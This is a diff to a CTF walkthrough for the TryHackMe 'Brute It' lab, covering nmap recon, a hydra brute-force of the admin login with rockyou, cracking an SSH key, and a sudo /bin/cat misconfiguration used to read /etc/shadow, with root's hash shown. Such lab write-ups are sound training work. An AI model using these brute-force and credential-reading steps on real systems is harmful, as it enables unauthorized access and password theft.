@@ -1,4 +1,9 @@
-Recon:
+Brute It is a tryhackme room where you learn about various bruteforcing techniques and tools found here:
+https://tryhackme.com/room/bruteit
+Difficulty: Easy
+DescriptionL: Learn how to brute, hash cracking and escalate privileges in this box!"
+
+## Recon:
 
 nmap -sC -sV -p-1024 10.10.148.230
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 19:46 GMT
@@ -46,7 +51,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2021/12/04 19:51:41 Finished
 ===============================================================
 
-
+# To understand the field needed for hydra to brute force a login page correctly looking at the source with CTRL+U most browser or
+# curl http://host/login.*
 
 <!DOCTYPE html>
 <html lang="en">
@@ -89,6 +95,8 @@ Q5:/admin
 
 Q6:
 
+## Bruteforcing Login
+
 Any bruteforcing to-do-list with hydra
 username = admin
 password = /rockyou.txt
@@ -98,7 +106,7 @@ pass
 F=Username or password invalid // This is the failure response code hydra needs exactly
 H=Cookie: security=low; PHPSESSID=insertcookiehere
 
-hydra -l admin -P /home/nvm/tryhackmeCourse/rockyou.txt -f 10.10.148.230 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid:H=Cookie: security=low; PHPSESSID=922ndjd5tc12kllvvscmvt6f0l" -t 16    
+hydra -l admin -P /rockyou.txt -f 10.10.148.230 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid:H=Cookie: security=low; PHPSESSID=922ndjd5tc12kllvvscmvt6f0l" -t 16    
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-04 20:02:33
@@ -110,7 +118,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-04 20:02:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-04 20:03:02
 
-Get the web flag after login as admin, and the rsa-key:
+
+
+## Foothold via hash-cracking the ssh key
+
+# Get the web flag after login as admin, and the rsa-key:
+
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
@@ -153,6 +166,7 @@ id
 uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
 cat user.txt
 
+## Linux Priv Esc
 
 john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
@@ -160,8 +174,12 @@ Matching Defaults entries for john on bruteit:
 
 User john may run the following commands on bruteit:
     (root) NOPASSWD: /bin/cat
+    
 john@bruteit:~$ /bin/cat /root/root.txt
 /bin/cat: /root/root.txt: Permission denied
+
+# Reading again, you would need to use <sudo> + <cat> to get the root-like privilege, but can then read the /etc/shadow file:
+
 john@bruteit:~$ sudo /bin/cat '/etc/shadow'
 root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
 daemon:*:18295:0:99999:7:::
